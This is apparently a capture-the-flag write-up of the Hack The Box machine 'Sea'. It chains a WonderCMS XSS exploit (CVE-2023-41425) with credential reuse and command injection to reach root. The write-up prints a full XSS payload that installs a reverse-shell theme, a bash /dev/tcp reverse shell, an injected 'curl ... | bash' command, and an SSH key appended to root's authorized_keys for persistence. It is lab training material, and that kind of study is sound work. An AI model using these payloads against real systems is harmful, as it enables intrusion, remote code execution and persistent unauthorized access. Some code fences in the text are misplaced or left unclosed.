# Inspecting Port 80

Screenshot of the website being hosted by Apache on port 80.

# URL: sea.htb/contact.php

A contact form which is requested a URL for a website. Since a website is being requested there could be a script automating visits to the link the user provides.

![d3f85e756149a40b7ef860b79f6f5e7f.png](/assets/img/d3f85e756149a40b7ef860b79f6f5e7f.png)

# XXS Testing

Testing the theory and submitting a URL to my own server to see if anything hits it.

## Request

Screenshot of the request before submitting it.

## Reponse

The box hits my server proving there is a script automating the process. This strongly hints towards XSS. When I completed the box on release this script was not functioning properly and the box required a reset to fix it.

# WonderCMS - CVE-2023-41425

Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.

Source: https://nvd.nist.gov/vuln/detail/CVE-2023-41425

POC: https://github.com/prodigiousMind/CVE-2023-41425/tree/main

# Testing POC

The script needed to be modified to load the zip from my own web server which the box has access to. Since machines on Hack the Box have no internet they cannot download from GitHub.

## Modifications

Highlight of the modifications.

```js
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.6/main.zip&directoryName=violet&type=themes&token=" + token;
```

## Payload (xss.js)

The XSS payload in full.

```
var url = "http://sea.htb/";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.6/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "10.10.14.6";
       var port = "9001";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
```

## Payload (test.html)

The web page in full linking to the Javascript payload.

```
<script src="http://10.10.14.6/xss.js"></script>
```

## Payload Response

The below screenshot shows the target visting the web page and also loading the XSS payload.

# Uploaded Shell

The exploit seems to have worked correctly. Not getting a 404 when visiting the expected location of the shell. The error message can be ignored.

# Inspecting Port 8080

Since port 8080 is commonly used by web servers I will try curl it. Results returned a web page showing authenication is required.

```

# Tunneling to Port 8080

Created a tunnel so I can access the service on my machine.

└─$ ssh -L 8081:127.0.0.1:8080 amay@sea.htb
```

## Port 8080 via Firefox

Basic authenication is requesting a username and password. 

![f5da972e8e2d142b6debb3c36bee2519.png](/assets/img/f5da972e8e2d142b6debb3c36bee2519.png)

## Credential Reuse (amay)

Using the known username and password it was possible to authenicate and view the web page. It seems to be a control panel thats under development and has several features.

![4a043d88390f1b8dc250059f21cd33f1.png](/assets/img/4a043d88390f1b8dc250059f21cd33f1.png)

# Command Injection

After much testing I eventually discovered a parameter which was vulnerable to command injection. Before testing for command injection I experimented with reading files via the analyze log file feature. I also fuzzed for hidden parameters and nothing of interest was discovered for both tests.

## Vulnerable Parameter (PING TEST)

The `log_file` parameter is vulernable to command injection when its appended with `&&` + `ping -c 3 10.10.14.6`. 

```
log_file=/var/log/apache2/access.log&&ping -c 3 10.10.14.6&analyze_log=
```

## Full Request

The request in full to ping my machine to prove RCE.

## Ping Recieved

Screenshot showing the target pinging my machine proving RCE was obtained.

![8e9ea4a03eadecd98d970ab45aa258ac.png](/assets/img/8e9ea4a03eadecd98d970ab45aa258ac.png)

## Reverse Shell Payload

File containing a bash reverse shell which will be hosted on a python web server.

```
┌──(kali㉿kali)-[~/hackthebox/sea]
└─$ cat shell    
bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
```

## Parameter Payload

The command in full to download the file containing the shell and piping it directly to bash to be executed.

```
log_file=/var/log/apache2/access.log&&curl 10.10.14.6/shell|bash&analyze_log=
```

## Reverse Shell (root)

It worked. For some reason the shell would die a few seconds after establishing a connection. There was enough time to execute commands by having it saved in the copy/paste buffer ready to go. I read the root.txt file this way. I also added keys to root's configuration which allowed root access via SSH.

# Adding SSH Keys (root)

The command used to write SSH keys to root profile.

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqQqZgFQhQP1ZZnQfcS+LXmBzBmDD8rTu5AgrSMpxIE kali@kali" >> /root/.ssh/authorized_keys
